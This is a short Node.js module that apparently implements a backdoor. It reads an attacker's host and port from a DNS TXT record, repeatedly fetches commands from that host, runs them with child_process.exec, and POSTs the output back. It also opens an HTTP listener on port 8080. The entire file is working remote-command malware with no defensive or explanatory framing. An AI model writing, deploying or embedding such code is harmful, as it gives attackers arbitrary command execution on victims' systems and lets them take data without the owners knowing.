const http = require('http');
const exec = require("child_process").exec;
const dns = require('dns')

let ATTACKER_IP = ""
let ATTACKER_PORT = 0

const runCommand = function(command, callback) {
    exec(command, (error, stdout, stderr) => {
        console.log(stdout)
        sendPost(stdout)
        sendPost(stderr)
        callback()
    })
}

const sendPost = function(data) {
    console.log(data)
    let response_data = '';
    let encoded_data = `rfile=${encodeURIComponent(data)}`;

    let req = http.request({
        hostname: ATTACKER_IP,
        port: ATTACKER_PORT,
        path: '/',
        method: 'POST',
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": encoded_data.length
        }
    }, (res) => {
        res.on('data', (chunk) => {
            response_data += chunk;
        });

        res.on('end', () => {
            console.log(response_data)
        });
    }).on("error", (err) => {
        console.log("Error: ", err)
    })

    req.write(encoded_data);
    req.end()
}

function attach() {
    const req = http.request({
        hostname: ATTACKER_IP,
        port: ATTACKER_PORT,
        path: '/',
        method: 'GET'
    }, (res) => {
        let command = ''

        res.on('data', (chunk) => {
            command += chunk;
        });

        // Ending the response
        res.on('end', () => {
            if (command === "terminate") {
                return;
            } else if (command === "grab") {
                console.log("future")
                attach()
            } else {
                if (command.replaceAll(" ", "") !== "") {
                    runCommand(command, function () {
                        attach()
                    })
                }
            }
        });

    }).on("error", (err) => {
        console.log("Error: ", err)
    }).end();
}


exports.run = function() {
    dns.resolveTxt('example.net', (err, records) => {
        console.log(records[0][0])
        ATTACKER_IP = records[0][0].split(":")[0]
        ATTACKER_PORT = parseInt(records[0][0].split(":")[1])
        attach();
    })

    const server = http.createServer(function (req, res) {
        res.writeHead(200);
        res.end("PONG");
    });
    server.listen(8080, '0.0.0.0', () => {
        console.log('Server is running ...')
    });
}
